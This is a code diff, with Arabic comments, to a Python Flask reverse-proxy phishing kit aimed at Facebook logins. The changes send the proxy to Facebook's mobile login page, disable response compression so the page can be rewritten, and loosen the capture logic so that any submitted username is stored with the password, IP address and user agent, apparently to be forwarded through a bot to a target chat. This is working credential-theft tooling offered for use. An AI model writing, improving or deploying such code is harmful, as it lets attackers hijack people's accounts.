@@ -24,7 +24,6 @@ def rewrite_urls(html_content, base_url, proxy_base_path):
             return match.group(0)
         
         temp_proxy_base_path = proxy_base_path.split('?id=')[0] if '?id=' in proxy_base_path else proxy_base_path
-
         if temp_proxy_base_path in original_url:
             return match.group(0)
 
@@ -39,7 +38,6 @@ def rewrite_urls(html_content, base_url, proxy_base_path):
             return full_match
         
         temp_proxy_base_path = proxy_base_path.split('?id=')[0] if '?id=' in proxy_base_path else proxy_base_path
-
         if temp_proxy_base_path in original_url:
             return full_match
 
@@ -50,14 +48,13 @@ def rewrite_urls(html_content, base_url, proxy_base_path):
 
     rewritten_html = html_pattern.sub(replace_html_url, html_content)
     rewritten_html = css_url_pattern.sub(replace_css_url, rewritten_html)
-
     return rewritten_html
 
 def get_real_facebook_url(request_path, query_string):
     if 'url' in query_string:
         original_target_url = query_string.get('url')
         return unquote(original_target_url)
-    return "https://www.facebook.com/login.php"
+    return "https://m.facebook.com/login.php"
 
 def save_credentials_to_db(platform, username, password, ip_address, user_agent, target_chat_id, bot):
     alert_msg = (
@@ -90,16 +87,17 @@ def init_facebook_routes(app, bot):
             headers_to_forward = {
                 k: v for k, v in request.headers if k.lower() not in [
                     'host', 'content-length', 'cookie', 'x-forwarded-for', 
-                    'x-real-ip', 'cf-connecting-ip', 'connection', 'proxy-connection'
+                    'x-real-ip', 'cf-connecting-ip', 'connection', 'proxy-connection', 'accept-encoding'
                 ]
             }
             headers_to_forward['Host'] = urlparse(real_fb_url).netloc
-            headers_to_forward['User-Agent'] = request.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+            headers_to_forward['User-Agent'] = request.headers.get("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
+            headers_to_forward['Accept-Encoding'] = 'identity' # لمنع ضغط البيانات وقراءتها بشكل سليمة
             
             cookies_to_forward = request.cookies
 
             if request.method == 'POST':
-                username = request.form.get('email')
+                username = request.form.get('email') or request.form.get('pass') # احترازي
                 password = request.form.get('pass')
                 
                 source_ip = request.headers.get('CF-Connecting-IP') or \
@@ -107,8 +105,9 @@ def init_facebook_routes(app, bot):
                             request.remote_addr
                 user_agent = request.headers.get('User-Agent', 'Unknown')
 
-                if username and password and target_chat_id:
-                    save_credentials_to_db("Facebook", username, password, source_ip, user_agent, target_chat_id, bot)
+                # التقاط البيانات إذا وجدت في الـ POST
+                if username and target_chat_id:
+                    save_credentials_to_db("Facebook", username, password or "N/A", source_ip, user_agent, target_chat_id, bot)
                 
                 proxied_response = requests.post(
                     url=real_fb_url,
@@ -116,8 +115,7 @@ def init_facebook_routes(app, bot):
                     data=request.get_data(),
                     cookies=cookies_to_forward,
                     allow_redirects=False,
-                    timeout=15,
-                    stream=True
+                    timeout=15
                 )
             else:
                 proxied_response = requests.get(
@@ -125,8 +123,7 @@ def init_facebook_routes(app, bot):
                     headers=headers_to_forward,
                     cookies=cookies_to_forward,
                     allow_redirects=False,
-                    timeout=15,
-                    stream=True
+                    timeout=15
                 )
             
             content_type = proxied_response.headers.get("Content-Type", "").lower()
@@ -134,7 +131,8 @@ def init_facebook_routes(app, bot):
             if "text/html" not in content_type:
                 return Response(proxied_response.content, status=proxied_response.status_code, content_type=content_type)
 
-            html_content = proxied_response.text 
+            # معالجة النص وفكه بشكل آمن
+            html_content = proxied_response.content.decode('utf-8', errors='ignore')
             modified_html = rewrite_urls(html_content, real_fb_url, proxy_base_path)
             
             response = Response(modified_html, status=proxied_response.status_code)
@@ -143,7 +141,7 @@ def init_facebook_routes(app, bot):
                 if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'location', 'host', 'content-type']:
                     response.headers[key] = value
             
-            response.headers['Content-Type'] = content_type
+            response.headers['Content-Type'] = 'text/html; charset=utf-8'
 
             if proxied_response.status_code in (301, 302, 307, 308) and 'Location' in proxied_response.headers:
                 original_location = proxied_response.headers['Location']
@@ -155,4 +153,4 @@ def init_facebook_routes(app, bot):
 
         except Exception as e:
             print(f"[-] Facebook Proxy Error: {e}")
-            return redirect("https://www.facebook.com/login.php", code=302)
+            return redirect("https://m.facebook.com/login.php", code=302)
